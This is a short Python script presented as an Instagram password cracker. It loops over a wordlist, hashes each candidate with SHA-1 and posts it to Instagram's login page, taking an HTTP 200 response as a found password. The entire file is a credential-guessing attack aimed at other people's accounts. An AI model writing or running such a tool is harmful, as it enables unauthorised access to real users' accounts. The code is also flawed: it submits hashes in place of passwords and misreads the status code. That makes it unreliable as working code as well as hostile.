import requests
import hashlib

def hash_password(password):
    """Generate the SHA-1 hash of the given password."""
    return hashlib.sha1(password.encode()).hexdigest()

def login(username, password):
    """Send a login request to the Instagram API."""
    url = "https://www.instagram.com/accounts/login/"
    data = {
        "username": username,
        "password": password,
    }
    response = requests.post(url, data=data)
    return response.status_code

def crack(username, wordlist):
    """Crack the given Instagram account using the provided wordlist."""
    for word in wordlist:
        password = hash_password(word)
        if login(username, password) == 200:
            print(f"The password is {word}")
            break

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("username", help="The Instagram username")
    parser.add_argument("wordlist", help="The path to the wordlist file")
    args = parser.parse_args()

    with open(args.wordlist, "r") as f:
        wordlist = [line.strip() for line in f]

    crack(args.username, wordlist)